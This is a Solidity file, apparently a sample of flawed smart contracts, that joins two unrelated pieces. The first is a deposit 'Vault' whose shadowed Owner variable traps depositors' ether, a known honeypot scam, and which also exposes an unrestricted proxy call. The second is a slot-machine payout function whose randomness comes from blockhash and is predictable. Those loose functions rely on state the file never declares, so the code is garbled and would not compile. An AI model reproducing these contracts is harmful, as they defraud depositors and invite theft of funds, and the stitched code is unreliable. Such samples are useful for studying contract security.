 

pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}

function _finishSpin(address target)
    private returns (uint)
{
    playerSpin memory spin = playerSpins[target];

    require(spin.tokenValue > 0); // No re-entrancy
    require(spin.blockn != block.number);

    uint profit = 0;
    uint category = 0;

    // If the block is more than 255 blocks old, we can't get the result
    // Also, if the result has already happened, fail as well
    uint result;
    if (block.number - spin.blockn > 255) {
      result = 9999; // Can't win: default to largest number
    } else {

      // Generate a result - random based ONLY on a past block (future when submitted).
      result = random(1000000, spin.blockn, target);
    }

    if (result > 476661) {
      emit Loss(target, spin.blockn);
      emit LogResult(target, result, profit, spin.tokenValue, category, false);
    } else if (result < 1) {
      profit = SafeMath.mul(spin.tokenValue, 500);
      category = 1;
      emit ThreeMoonJackpot(target, spin.blockn);
    } else if (result < 298) {
      profit = SafeMath.mul(spin.tokenValue, 232);
      category = 2;
      emit TwoMoonPrize(target, spin.blockn);
    } else if (result < 3127) {
      profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232), 10);
      category = 3;
      emit ZTHJackpot(target, spin.blockn);
    } else if (result < 5956) {
      profit = SafeMath.mul(spin.tokenValue, 25);
      category = 4;
      emit ThreeZSymbols(target, spin.blockn);
    } else if (result < 8785) {
      profit = SafeMath.mul(spin.tokenValue, 25);
      category = 5;
      emit ThreeTSymbols(target, spin.blockn);
    } else if (result < 11614) {
      profit = SafeMath.mul(spin.tokenValue, 25);
      category = 6;
      emit ThreeHSymbols(target, spin.blockn);
    } else if (result < 14443) {
      profit = SafeMath.mul(spin.tokenValue, 50);
      category = 7;
      emit ThreeEtherIcons(target, spin.blockn);
    } else if (result < 17272) {
      profit = SafeMath.mul(spin.tokenValue, 40);
      category = 8;
      emit ThreeGreenPyramids(target, spin.blockn);
    } else if (result < 20101) {
      profit = SafeMath.mul(spin.tokenValue, 20);
      category = 9;
      emit ThreeGoldPyramids(target, spin.blockn);
    } else if (result < 22929) {
      profit = SafeMath.mul(spin.tokenValue, 20);
      category = 10;
      emit ThreeWhitePyramids(target, spin.blockn);
    } else if (result < 52332) {
      profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 125), 10);
      category = 11;
      emit OneMoonPrize(target, spin.blockn);
    } else if (result < 120225) {
      profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 15), 10);
      category = 12;
      emit OneOfEachPyramidPrize(target, spin.blockn);
    } else if (result < 171146) {
      profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232), 100);
      category = 13;
      emit TwoZSymbols(target, spin.blockn);
    } else if (result < 222067) {
      profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232), 100);
      category = 14;
      emit TwoTSymbols(target, spin.blockn);
    } else if (result < 272988) {
      profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232), 100);
      category = 15;
      emit TwoHSymbols(target, spin.blockn);
    } else if (result < 323909) {
      profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 375), 100);
      category = 16;
      emit TwoEtherIcons(target, spin.blockn);
    } else if (result < 374830) {
      profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 35), 10);
      category = 17;
      emit TwoGreenPyramids(target, spin.blockn);
    } else if (result < 425751) {
      profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 225), 100);
      category = 18;
      emit TwoGoldPyramids(target, spin.blockn);
    } else {
      profit = SafeMath.mul(spin.tokenValue, 2);
      category = 19;
      emit TwoWhitePyramids(target, spin.blockn);
    }

    emit LogResult(target, result, profit, spin.tokenValue, category, true);
    contractBalance = contractBalance.sub(profit);
    ZTHTKN.transfer(target, profit);
    
    playerSpins[target] = playerSpin(uint200(0), uint48(0));
    return result;
}

function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {
    return maxRandom(blockn, entropy) % upper;
}

function maxRandom(uint blockn, address entropy) private view returns (uint256 randomNumber) {
    return uint256(keccak256(
        abi.encodePacked(
        blockhash(blockn),
        entropy)
      ));
}

